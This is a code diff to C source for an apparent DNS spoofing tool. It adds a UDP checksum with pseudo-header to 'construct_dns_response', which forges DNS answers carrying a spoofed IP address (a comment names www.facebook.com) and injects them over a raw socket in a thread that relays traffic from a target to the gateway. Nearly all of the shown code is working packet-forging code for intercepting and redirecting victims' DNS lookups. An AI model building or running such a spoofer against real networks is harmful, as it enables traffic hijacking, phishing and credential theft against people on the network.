@@ -43,7 +43,58 @@ void dns_pac_status(uint8_t* pac, char* qname, uint16_t qtype, uint16_t qclass){
     fprintf(stderr, "____________________________________\n\n");
 
 }
-uint16_t cksum (const void *_data, int len) {
+
+
+
+//! \brief
+//!     Calculate the UDP checksum (calculated with the whole
+//!     packet).
+//! \param buff The UDP packet.
+//! \param len The UDP packet length.
+//! \param src_addr The IP source address (in network format).
+//! \param dest_addr The IP destination address (in network format).
+//! \return The result of the checksum.
+
+uint16_t udp_checksum(const void *buff, size_t len, in_addr_t src_addr, in_addr_t dest_addr)
+{
+        const uint16_t *buf=buff;
+        uint16_t *ip_src=(void *)&src_addr, *ip_dst=(void *)&dest_addr;
+        uint32_t sum;
+        size_t length=len;
+ 
+        // Calculate the sum                                            //
+        sum = 0;
+        while (len > 1)
+        {
+                sum += *buf++;
+                if (sum & 0x80000000)
+                        sum = (sum & 0xFFFF) + (sum >> 16);
+                len -= 2;
+        }
+ 
+        if ( len & 1 )
+                // Add the padding if the packet lenght is odd          //
+                sum += *((uint8_t *)buf);
+ 
+        // Add the pseudo-header                                        //
+        sum += *(ip_src++);
+        sum += *ip_src;
+ 
+        sum += *(ip_dst++);
+        sum += *ip_dst;
+ 
+        sum += htons(IPPROTO_UDP);
+        sum += htons(length);
+ 
+        // Add the carries                                              //
+        while (sum >> 16)
+                sum = (sum & 0xFFFF) + (sum >> 16);
+ 
+        // Return the one's complement of sum                           //
+        return ( (uint16_t)(~sum)  );
+}
+
+uint16_t ip_cksum (const void *_data, int len) {
   const uint8_t *data = _data;
   uint32_t sum;
 
@@ -56,6 +107,9 @@ uint16_t cksum (const void *_data, int len) {
   sum = htons (~sum);
   return sum ? sum : 0xffff;
 }
+
+
+
 
 void extract_dns_request(uint8_t *query_data, uint8_t *request){
   unsigned int i, j, k;
@@ -142,12 +196,16 @@ uint8_t* construct_dns_response(uint8_t* ether_shost, uint8_t* ether_dhost, //l2
         *(dns_answer->data+i) = *(ip_spoof+i);
 
     //fprintf(stderr, "UDP Len: %d byte\n", ntohs(udp_hdr->len));
-    udp_hdr->uh_sum = cksum( udp_hdr, ntohs(udp_hdr->uh_ulen));
+
+    uint32_t src_addr = ip_hdr->saddr[0]<<24 | ip_hdr->saddr[1]<<16 | ip_hdr->saddr[2]<<8 | ip_hdr->saddr[3];
+    uint32_t dst_addr = ip_hdr->daddr[0]<<24 | ip_hdr->daddr[1]<<16 | ip_hdr->daddr[2]<<8 | ip_hdr->daddr[3];
+
+    udp_hdr->uh_sum = udp_checksum( udp_hdr, ntohs(udp_hdr->uh_ulen), src_addr, dst_addr);
 
 
 
     //fprintf(stderr, "IP Len: %d byte\n", ntohs(ip_hdr->tot_len));
-    ip_hdr->check = cksum(ip_hdr, sizeof(struct iphdr));
+    ip_hdr->check = ip_cksum(ip_hdr, sizeof(struct iphdr));
 
 
     uint8_t* dns_pac = malloc(IP_PACKET_LEN);
@@ -158,12 +216,7 @@ uint8_t* construct_dns_response(uint8_t* ether_shost, uint8_t* ether_dhost, //l2
     memcpy(dns_pac + sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr), dns_hdr, sizeof(struct dnshdr));
     memcpy(dns_pac + sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dnshdr), query_data, 22); //www.facebook.com type A class IN
     memcpy(dns_pac + sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dnshdr) + 22, dns_answer, sizeof(struct dnsanswer));
-    //fprintf(stderr, "Contruct fake dns response\n");
-    /*
-    for(i = 0; i< sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dnshdr) + 22 + sizeof(struct dnsanswer); i++){
-        fprintf(stderr, "%.2x ", *(dns_pac+i));
-    }
-    fprintf(stderr, "\n");*/
+
     return dns_pac;
 }
 void* target_to_gateway(void* args){
@@ -197,7 +250,7 @@ void* target_to_gateway(void* args){
                     extract_dns_request(query_data, qname_str);
                     
                     
-                    //fprintf(stderr, "Query data: ");
+
                     for(i = 0; i < byte_recv - (sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dnshdr)); i++){
                         //fprintf(stderr, "%.2x ", *(query_data+i));
                     }
@@ -223,7 +276,7 @@ void* target_to_gateway(void* args){
                         fprintf(stderr, "DNS response (%d bytes): ", dns_res_len);
                         for(i = 0; i < dns_res_len; i++)
                             fprintf(stderr, "%.2x ", *(dns_res+i));
-
+                        
                         if(!sendto(sock_ip, dns_res, dns_res_len, 0, (struct sockaddr*) &(argument->socket_address), argument->addr_len))
                             fprintf(stderr, "Error in forwading\n");
                    }
